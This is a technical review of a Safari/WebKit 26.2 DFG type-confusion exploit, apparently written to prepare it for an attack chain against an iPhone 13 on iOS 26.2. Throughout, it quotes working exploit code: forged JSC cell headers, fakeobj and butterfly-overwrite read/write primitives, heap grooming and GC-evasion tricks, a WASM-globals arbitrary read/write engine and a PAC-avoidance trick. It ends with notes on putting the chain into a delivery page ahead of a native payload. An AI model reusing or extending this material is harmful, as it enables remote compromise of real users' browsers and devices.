# webkit_poc_review.md — W-T1c source review of retX0/safari-26.2-dfg-type-confusion

Reviewed 2026-10-10 against the repo's main branch (wasm_rw.js sha 9862b0549228,
18711 B; poc_addrof.html 9180 B; logging.js 690 B; index.html 933 B). Verdict up
front: **no 26.2 / iPhone14,5 contradiction found**; the PoC is version-agnostic in
its memory layout assumptions (everything is scanned at runtime). Its assumptions
are about JSC *engine structure*, not build offsets.

## Q1 — hardcoded JSC versions/offsets; 26.2-specific?

NO hardcoded version checks or absolute offsets. Every structural constant is
either a long-stable JSC enum or discovered by scan:

    let fakeHeader = 1n | (0x07n << 32n) | (0x25n << 40n) | (0x01n << 56n);   // SID=1, indexingType=0x07, jsType=0x25, flags=0x01
    for (let off = 0x80; off <= 0x300; off += 8) { ... v128instAddr + BigInt(off) ... }   // v128 instance field offset: SCANNED
    for (let woff = 8; woff <= 56; woff += 8) { ... read64(jsAddr + woff) ... }            // wasm global ptr qword: SCANNED
    for (let goff = 0; goff < 96; goff += 8) { ... read64(wasmGlobalPtr + goff) ... }    // global value slot: SCANNED
    for (let off = 0; off < 576; off += 8) { ... read64(executorAddr + off) ... }        // instance global-slot: SCANNED

The only build-flavoured assertion is the fake header (StructureID=1, DoubleShape
indexing type) and the Gigacage sanity window:

    if (bf_bits < 0x100000000n || bf_bits > 0x0000FFFFFFFFFFFFn || bf_bits === 0x7FF8000000000000n) continue;

That window (>= 2^32, < 2^48, not the canonical NaN) is architecture-level, not
26.2-level. The DFG bug itself is one token in DFGNodeType.h, fixed 2026-03-07 —
after the 26.2 wave. Nothing contradicts 23C55.

## Q2 — Gigacage layout / butterfly assumptions

Butterflies live in the Gigacage and get reused; the victim CELL is a
JSFinalObject in a subspace that is NOT reused, so the overlap must be with a
fresh butterfly array. The identification loop is empirical, not positional:

    let saved = hitSpray[i][0]; hitSpray[i][0] = { _u: true };
    if (f2i(holder.key[0]) !== rawBits) { matchIdx = i; hitSpray[i][0] = saved; break; }

iPhone-specific grooming is explicit in the comments (bump-allocator ordering):

    // Cell sled: same-structure FinalObjects allocated AFTER {0:marker}.
    // Bump pointer puts them at HIGHER addresses than {0:marker}'s cell.
    // When freed together by gcEden: sled -> freelist HEAD, {0:marker}.next = sled -> non-null.
    // This prevents StructureID=0 crash on iPhone where {0:marker} ends up at freelist tail.
    let _cc = []; for (let k = 0; k < 64; k++) _cc.push({ 0: 0.0 }); _cc = null;

The bootstrap R/W is then butterfly-primitive: writing `container[1]` as raw
bits REPLACES the fake array's butterfly pointer:

    container[1] = i2f(structArrBF); let fakeArr = _fakeobj(containerBF);
    function _bootstrap_read64(addr) { ... container[1] = i2f(addr + 8n); val = _readElement(fakeArr, 0); ... }

Assumption list: (a) DoubleShape array elements are raw doubles read/writable
via normal element access; (b) fake object creation succeeds for a cell header
with a stolen StructureID; (c) the JSArray's butterfly field sits at element
slot 1 of the container array (JSArray layout: [0]=structure/map, [1]=butterfly)
— this is the layout fact load-bearing for the whole chain and it is stable
across JSC 26.x.

## Q3 — GC defeat during the UAF window

NO pinning. Pure grooming + timing + one ARM64-specific trick:
- Promotion: three full GCs with the holder BEFORE the UAF (`await gcFull(); await
  gcFull(); await gcFull();` then `holder.key = key` stores only tenured refs).
- Nursery carving: `for (let i = 0; i < 200000; i++) { let x = { 0: i * 1.1 }; }`
  then one Eden GC — a deterministically-shaped nursery.
- Per-round Eden GC, drain spray (4000 arrays), storeKey, then TWO deepClobber
  calls: recursion depth 300 with 32 spilled locals clobbers the conservative
  native stack so the scanner cannot rediscover stale interior refs:

    function deepClobber(n) { let a0=0..d7=0 (32 locals); if (n > 0) return deepClobber(n - 1); return a0+b0+c0+d0; }
    storeKey(100.1 + r); deepClobber(300); deepClobber(300);

- Post-window: a fresh Eden GC frees the key, cell sled keeps StructureID valid,
  then the reusable spray (`sp.push([{ _: 1 }])` x3000) reclaims the butterfly.
- Survival after exploitation is EXPLICIT (the teardown comment names the root
  cause: conservative stack scan finds containerBF and follows the fake
  butterfly): restore navigator g0 slot, restore `container[1] = structArrBF`.

    // JSC conservative GC scans native stack and may find containerBF (the fakeArr address)...

## Q4 — what the WASM portable-globals step buys

It buys a GC-STABLE typed R/W path that does not keep the fake array live.
Bootstrap R/W via fakeArr still works, but every read/write touches
`container`/`fakeArr` whose butterfly now points into WASM internals — a
conservative scan of those objects crashes GC (same root cause as teardown). The
final API re-routes through two wasm instances whose g0/g1 import slots are
hijacked once:

    _bootstrap_write64(navigatorAddr + BigInt(exe_g0_slot_off), executorAddr + BigInt(exe_g1_slot_off));
    window.read32 = function (addr) { navigator_.exports.b(addr); return executor.exports.c() >>> 0; };
    window.write32 = function (addr, val) { navigator_.exports.b(addr); executor.exports.d(val); };

i.e. the Navigator instance's imported-global value slot is redirected to the
Executor's; writes land anywhere, reads return 32-bit halves. module is 90 bytes
with two mutable globals (i64 g0, i32 g1), JIT'd via 22 warmup iterations
(`[+] JIT warmup done (22 iters -> BBQ)`). It IS necessary for a usable engine:
bootstrap alone is enough to boot, but every subsequent GC scans the still-live
fakeArr. Given our native stage needs repeated R/W (kernel addresses are far
from the JS heap), the WASM engine is the required primitive, not ornament.

## Q5 — what the ~80% measures

Full establishment of AAR/AAW, not a partial stage. The failure modes quoted in
code are exactly the two give-up points (each is a `quit()`, i.e. page reload):

    if (!hitSpray) { print("[-] Butterfly reuse failed"); quit(); }
    if (containerBF === 0n) { print("[-] v128 butterfly leak FAILED"); quit(); }

So ~80% = P(butterfly overlap lands in <=600 rounds AND v128 slot scan AND
instance-slot scan all succeed). The README says failures reload the page and
crashes are rare. For our purposes: assume ~20% of guests need a fresh launch,
which the state machine already absorbs.

## Q6 — page tables / JIT permissions / SPTM-adjacent?

NO. Pure renderer-side JS+WASM heap manipulation: JSC cells, butterflies, WASM
instance globals. One notable PAC-adjacent detail — the Safari element access
is routed through `new Function` (interpreted, JIT-less) specifically to dodge
JIT-emitted PAC checks:

    // Safari key: use new Function() to access fake objects (bypass JIT PAC checks)
    const _readElement = new Function('obj', 'idx', 'return obj[idx]');
    const _writeElement = new Function('obj', 'idx', 'val', 'obj[idx] = val');

That is arm64e-relevant (A15 has PAC) and it means the primitive stays inside
the JS heap — nothing kernel-adjacent, no page-table touch, no SPTM surface.

## Q7 — device claims vs iPhone14,5

README claims: "Safari <= 26.2 (WebKit 21623.1.14.11.9)", tested "stock iPhone
(iOS 26.1) and macOS 26.2". iPhone14,5 (iPhone 13) is not named, but:
- our OS build 23C55 = iOS 26.2, exactly the upper edge of the affected table;
- JSC is per-OS-build, not per-model (same JS binary for all A15 devices on
  23C55);
- the cell-sled fix exists BECAUSE the author hit iPhone-specific GC freelist
  ordering, i.e. the chain is iPhone-calibrated, not macOS-calibrated.
No contradiction. The [VP-DEVICE] confirmation still requires the W-T0
fingerprint from the actual WKWebView (userAgent string + the PoC's own
self-test).

## Verdict for W-T2 planning

- Trigger + grooming code is portable as-is; no version table to maintain.
- Two integration notes for the bundle page: (1) keep `new Function` element
  access; (2) keep teardown before handing control to native, or GC will hunt
  the fake butterfly after the payload runs.
- logging.js is XHR-based: it POSTs to a server (`server.js` — Bun) — for the
  IPA it must be replaced by the native JS bridge (W-T2 change, noted for
  implementation).
